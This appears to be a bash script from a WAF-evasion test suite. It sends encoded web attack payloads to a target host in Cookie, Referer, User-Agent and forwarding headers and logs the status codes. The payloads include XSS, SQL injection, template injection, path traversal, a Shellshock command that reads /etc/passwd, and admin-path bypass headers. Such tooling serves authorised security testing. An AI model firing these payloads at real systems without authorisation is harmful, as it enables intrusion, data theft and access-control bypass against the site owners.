#!/bin/bash
# Header and cookie injection with encoded payloads
# Tests whether WAF inspects and decodes headers/cookies, not just query params
# Estimated duration: 1-2 minutes
set -euo pipefail

TARGET="${1:?Usage: 07-header-cookie-evasion.sh <TARGET_FQDN>}"
BASE="${TARGET_PROTOCOL:-http}://${TARGET}"

echo "[*] Header & Cookie Encoding Evasion against ${TARGET}"
echo ""

echo "[+] Encoded payloads in Cookie header"
COOKIE_PAYLOADS=(
  "session=<script>alert(1)</script>"
  "session=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  "session=%253Cscript%253Ealert(1)%253C%252Fscript%253E"
  "session=' OR 1=1--"
  "session=%27%20OR%201%3D1--"
  "session={{7*7}}"
  "session=\${7*7}"
  "session=../../etc/passwd"
  "user=admin%00; session=valid"
)

for payload in "${COOKIE_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Cookie: ${payload}" \
    "${BASE}/" --max-time 10) || code="ERR"
  printf "    Cookie: %-45s -> HTTP %s\n" "${payload:0:45}" "${code}"
done
echo ""

echo "[+] Encoded payloads in Referer header"
REFERER_PAYLOADS=(
  "https://evil.com/<script>alert(1)</script>"
  "https://evil.com/%3Cscript%3Ealert(1)%3C/script%3E"
  "https://evil.com/' OR 1=1--"
  "https://evil.com/{{7*7}}"
)

for payload in "${REFERER_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "Referer: ${payload}" \
    "${BASE}/" --max-time 10) || code="ERR"
  printf "    Referer: %-43s -> HTTP %s\n" "${payload:0:43}" "${code}"
done
echo ""

echo "[+] Encoded payloads in User-Agent header"
UA_PAYLOADS=(
  "<script>alert(1)</script>"
  "' OR 1=1--"
  "{{7*7}}"
  "() { :;}; /bin/bash -c 'cat /etc/passwd'"
  "%3Cscript%3Ealert(1)%3C/script%3E"
)

for payload in "${UA_PAYLOADS[@]}"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "User-Agent: ${payload}" \
    "${BASE}/" --max-time 10) || code="ERR"
  printf "    UA: %-48s -> HTTP %s\n" "${payload:0:48}" "${code}"
done
echo ""

echo "[+] Encoded payloads in X-Forwarded-For / custom headers"
HEADER_PAYLOADS=(
  "X-Forwarded-For|127.0.0.1' OR 1=1--"
  "X-Forwarded-For|<script>alert(1)</script>"
  "X-Original-URL|/admin"
  "X-Rewrite-URL|/admin"
  "X-Custom-IP-Authorization|127.0.0.1"
  "Content-Type|application/xml;charset=utf-7"
)

for entry in "${HEADER_PAYLOADS[@]}"; do
  header="${entry%%|*}"
  value="${entry#*|}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    -H "${header}: ${value}" \
    "${BASE}/" --max-time 10) || code="ERR"
  printf "    %-25s: %-25s -> HTTP %s\n" "${header}" "${value:0:25}" "${code}"
done
echo ""

echo "[*] Header & cookie evasion complete"
